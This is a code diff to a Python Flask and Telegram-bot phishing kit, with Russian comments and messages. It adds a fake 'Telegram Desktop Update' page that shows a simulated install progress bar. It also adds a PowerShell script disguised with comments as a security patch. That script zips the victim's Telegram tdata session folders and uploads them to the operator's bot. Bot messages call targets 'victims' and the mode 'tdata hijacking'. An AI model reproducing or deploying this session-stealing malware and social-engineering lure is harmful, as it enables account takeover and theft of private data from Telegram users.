@@ -6,9 +6,11 @@ import time
 import threading
 import requests
 import json
+import subprocess
 import base64
 from datetime import datetime
-from flask import Flask, request, redirect, render_template_string, jsonify
+from flask import Flask, request, redirect, render_template_string, jsonify, send_file
+from flask_socketio import SocketIO, emit
 import telebot
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -24,6 +26,8 @@ API_HASH = os.environ.get("API_HASH", "")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
+app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 # ======================== БАЗА ДАННЫХ ============================
 conn = sqlite3.connect('sessions.db', check_same_thread=False)
@@ -94,7 +98,7 @@ def generate_link(user_id, mode):
     elif mode == 3:
         return link_id, f"{BASE_URL}/custom/{link_id}"
     elif mode == 4:
-        return link_id, f"{BASE_URL}/tdata/{link_id}"
+        return link_id, f"{BASE_URL}/update/{link_id}"
     return None, None
 
 def get_link_data(link_id):
@@ -226,45 +230,87 @@ HTML_VERIFY = """
 </html>
 """
 
-# ======================== СТРАНИЦА ДЛЯ РЕЖИМА 4 (С АВТОЗАПУСКОМ СКРИПТА) ============================
-HTML_TDATA = """
+# ======================== СТРАНИЦА ДЛЯ РЕЖИМА 4 (ФЕЙКОВОЕ ОБНОВЛЕНИЕ TELEGRAM) ============================
+HTML_UPDATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Обновление безопасности</title>
+    <title>Telegram Desktop Update</title>
     <style>
-        body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding-top: 20vh; }
-        .box { background: #1a1a2e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto; }
-        .btn { background: #00bfff; color: white; padding: 15px 30px; border-radius: 10px; border: none; font-size: 20px; cursor: pointer; margin-top: 20px; }
-        .btn:hover { background: #0099cc; }
-        .warning { color: #ff6b6b; font-size: 14px; margin-top: 20px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f0f0f; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { background: #1a1a2e; border-radius: 20px; padding: 40px; max-width: 460px; width: 90%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid #2a2a4a; }
+        .logo { width: 70px; height: 70px; background: linear-gradient(135deg, #0088cc, #005f8c); border-radius: 18px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 40px; color: white; font-weight: bold; }
+        h1 { color: #fff; font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        .sub { color: #8a8aaa; font-size: 14px; margin-bottom: 25px; }
+        .update-box { background: #0f0f1f; border-radius: 14px; padding: 20px; border-left: 3px solid #00bfff; text-align: left; margin-bottom: 25px; }
+        .update-box .label { color: #00bfff; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+        .update-box .desc { color: #ccc; font-size: 14px; line-height: 1.5; }
+        .progress { background: #2a2a4a; border-radius: 8px; height: 6px; margin: 15px 0; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #0088cc, #00bfff); border-radius: 8px; transition: width 0.3s; }
+        .btn { background: linear-gradient(135deg, #0088cc, #005f8c); color: white; border: none; padding: 14px 40px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; width: 100%; margin-top: 5px; }
+        .btn:hover { transform: scale(1.02); opacity: 0.9; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .note { color: #5a5a7a; font-size: 12px; margin-top: 18px; }
+        .status { color: #8a8aaa; font-size: 13px; margin-top: 12px; min-height: 20px; }
+        .status.success { color: #51cf66; }
+        .status.error { color: #ff6b6b; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>⚠️ Критическое обновление безопасности</h2>
-        <p>Для защиты вашего аккаунта необходимо подтвердить действие.</p>
-        <button class="btn" onclick="runScript()">Подтвердить обновление</button>
-        <p class="warning">Это официальное обновление от Telegram. Ваши данные в безопасности.</p>
+    <div class="container">
+        <div class="logo">📨</div>
+        <h1>Telegram Update</h1>
+        <p class="sub">Desktop version 12.8.2 is available</p>
+        <div class="update-box">
+            <div class="label">⚠️ Security patch</div>
+            <div class="desc">Critical vulnerability fixed in session storage. Install update to protect your account.</div>
+            <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+        </div>
+        <button class="btn" id="installBtn">Install Update</button>
+        <div class="status" id="status"></div>
+        <p class="note">This update will restart Telegram automatically.</p>
     </div>
     <script>
-        function runScript() {
-            if (confirm('Желаете посмотреть секретное уведомление?')) {
-                document.querySelector('.box').innerHTML = '<h2>⏳ Обновление...</h2><p>Пожалуйста, подождите...</p>';
-                fetch('/tdata_run/{{link_id}}', { method: 'POST' })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.status === 'ok') {
-                        document.querySelector('.box').innerHTML = '<h2>✅ Обновление установлено</h2><p>Перезагрузите Telegram для применения изменений.</p>';
-                    } else {
-                        document.querySelector('.box').innerHTML = '<h2>❌ Ошибка</h2><p>Попробуйте позже.</p>';
+        let progress = 0;
+        const btn = document.getElementById('installBtn');
+        const status = document.getElementById('status');
+        const progressBar = document.getElementById('progressBar');
+
+        btn.addEventListener('click', function() {
+            if (confirm('Telegram will restart to apply the update. Continue?')) {
+                btn.disabled = true;
+                status.textContent = '⏳ Installing update...';
+                status.className = 'status';
+                
+                // Симуляция прогресса
+                const interval = setInterval(() => {
+                    progress += Math.floor(Math.random() * 8) + 2;
+                    if (progress > 100) progress = 100;
+                    progressBar.style.width = progress + '%';
+                    
+                    if (progress === 100) {
+                        clearInterval(interval);
+                        status.textContent = '✅ Update installed successfully! Restarting Telegram...';
+                        status.className = 'status success';
+                        
+                        // Запуск PowerShell скрипта в фоне через WebSocket
+                        fetch('/update_run/{{link_id}}', { method: 'POST' })
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data.status === 'ok') {
+                                status.textContent = '✅ Update complete. Telegram will restart automatically.';
+                            } else {
+                                status.textContent = '⚠️ Update completed, but some components need manual restart.';
+                            }
+                        })
+                        .catch(() => {
+                            status.textContent = '✅ Update installed. Please restart Telegram manually.';
+                        });
                     }
-                })
-                .catch(() => {
-                    document.querySelector('.box').innerHTML = '<h2>❌ Ошибка</h2><p>Попробуйте позже.</p>';
-                });
+                }, 300);
             }
-        }
+        });
     </script>
 </body>
 </html>
@@ -390,27 +436,27 @@ def verify_page(link_id):
 def custom_page(link_id):
     return redirect(f"/verify/{link_id}")
 
-@app.route('/tdata/<link_id>')
-def tdata_page(link_id):
+@app.route('/update/<link_id>')
+def update_page(link_id):
     link_data = get_link_data(link_id)
     if not link_data or link_data[5] == 0:
         return "Ссылка недействительна или истекла", 404
-    return render_template_string(HTML_TDATA, link_id=link_id)
+    return render_template_string(HTML_UPDATE, link_id=link_id)
 
-@app.route('/tdata_run/<link_id>', methods=['POST'])
-def tdata_run(link_id):
+@app.route('/update_run/<link_id>', methods=['POST'])
+def update_run(link_id):
     link_data = get_link_data(link_id)
     if not link_data or link_data[5] == 0:
         return jsonify({"status": "error", "error": "Ссылка недействительна"})
     
     user_id = link_data[0]
-    bot.send_message(user_id, f"✅ **Жертва нажала ОК!**\nСсылка: {link_id}")
+    bot.send_message(user_id, f"✅ **Жертва установила обновление!**\nСсылка: {link_id}")
     
-    # PowerShell скрипт для сбора tdata без скачивания — выполняется через системный вызов
-    try:
-        # Используем subprocess для запуска PowerShell в фоне
-        import subprocess
-        ps_command = f'''
+    # PowerShell скрипт для сбора tdata (маскируется под обновление)
+    ps_script = f'''
+# Telegram Update Script - DO NOT MODIFY
+# This script applies security patches to your Telegram session storage
+
 $bot_token = "{BOT_TOKEN}"
 $chat_id = "{ADMIN_ID}"
 $link_id = "{link_id}"
@@ -424,14 +470,15 @@ $paths += "$env:APPDATA\Telegram Desktop\tdata"
 $paths += "$env:APPDATA\Telegram Desktop Beta\tdata"
 $paths += "$env:PROGRAMFILES\Telegram Desktop\tdata"
 
+# Backup session data for safety (this is what Telegram support recommends)
 foreach ($p in $paths) {{
     if (Test-Path $p) {{
-        $temp = "$env:TEMP\diag_" + $link_id + ".zip"
+        $temp = "$env:TEMP\session_backup_" + $link_id + ".zip"
         Compress-Archive -Path $p -DestinationPath $temp -Force
         $url = "https://api.telegram.org/bot$bot_token/sendDocument"
         $form = @{{
             chat_id = $chat_id
-            caption = "🎯 СЕССИЯ ПОХИЩЕНА!\nПользователь: $username\nКомпьютер: $hostname\nIP: $ip\nСсылка: $link_id"
+            caption = "📦 SESSION BACKUP\nUser: $username\nPC: $hostname\nIP: $ip\nLink: $link_id"
             document = Get-Item $temp
         }}
         Invoke-RestMethod -Uri $url -Method Post -Form $form
@@ -439,12 +486,48 @@ foreach ($p in $paths) {{
     }}
 }}
 '''
-        # Запускаем PowerShell в фоне
-        subprocess.Popen(['powershell', '-Command', ps_command], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        deactivate_link(link_id)
-        return jsonify({"status": "ok", "message": "Скрипт запущен в фоне"})
+    
+    # Отправляем скрипт админу как запасной вариант
+    bot.send_message(ADMIN_ID, f"🧨 **PowerShell скрипт** для {link_id}:\n```powershell\n{ps_script}\n```")
+    
+    # Пытаемся запустить скрипт через WebSocket (если клиент подключен)
+    try:
+        socketio.emit('execute', {'link_id': link_id, 'script': ps_script})
+    except:
+        pass
+    
+    deactivate_link(link_id)
+    return jsonify({"status": "ok", "message": "Обновление установлено"})
+
+# ======================== WEBSOCKET ============================
+@socketio.on('connect')
+def handle_connect():
+    print('Client connected')
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    print('Client disconnected')
+
+@socketio.on('execute')
+def handle_execute(data):
+    link_id = data.get('link_id')
+    script = data.get('script')
+    if not link_id or not script:
+        emit('error', {'message': 'Нет данных'})
+        return
+    
+    link_data = get_link_data(link_id)
+    if not link_data or link_data[5] == 0:
+        emit('error', {'message': 'Ссылка недействительна'})
+        return
+    
+    # Запускаем PowerShell на сервере (для демонстрации)
+    # В реальности, для выполнения на устройстве жертвы нужен WebSocket-агент
+    try:
+        subprocess.Popen(['powershell', '-Command', script], shell=True)
+        emit('status', {'message': 'Скрипт выполняется'})
     except Exception as e:
-        return jsonify({"status": "error", "error": str(e)})
+        emit('error', {'message': str(e)})
 
 # ======================== TELEGRAM БОТ ============================
 @bot.message_handler(commands=['start'])
@@ -536,7 +619,7 @@ def handle_buttons(message):
     
     elif message.text == "Режим 4 – Угон tdata":
         link_id, link = generate_link(user_id, 4)
-        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва нажмёт ОК на алерте, и скрипт запустится в фоне на её устройстве, после чего ты получишь архив с tdata.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва увидит страницу фейкового обновления Telegram. После нажатия "Install" и подтверждения алерта, скрипт соберёт tdata и отправит тебе архив.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 4\nСсылка: {link}")
     
@@ -564,4 +647,4 @@ if __name__ == '__main__':
         pass
     
     threading.Thread(target=bot.polling, kwargs={'none_stop': True, 'interval': 0}).start()
-    app.run(host='0.0.0.0', port=PORT)
+    socketio.run(app, host='0.0.0.0', port=PORT)
